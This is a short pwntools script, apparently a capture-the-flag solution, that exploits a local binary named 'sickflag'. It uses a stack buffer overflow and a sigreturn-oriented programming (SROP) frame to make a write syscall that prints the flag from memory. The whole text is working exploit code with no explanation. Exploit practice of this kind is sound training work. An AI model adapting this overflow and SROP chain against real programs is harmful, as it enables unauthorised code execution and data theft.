from pwn import*

exe = ELF('./sickflag',checksec = False)
context.arch = 'amd64'
context.binary = exe

p = process(exe.path)


gdb.attach(p, gdbscript='''
b*0x0000000000401221
c
''')
flag = 0x4040a0
syscall = 0x401224
mov_al_0xf = 0x401222
ret = 0x0000000000401016
read = 0x0000000000401050

frame = SigreturnFrame()
frame.rax = 0x1
frame.rdi = 1
frame.rip = syscall
frame.rsi = flag
frame.rdx = 0x100

payload = b"a"*0x28 + p64(mov_al_0xf) + bytes(frame)
p.sendline(payload)

p.interactive()

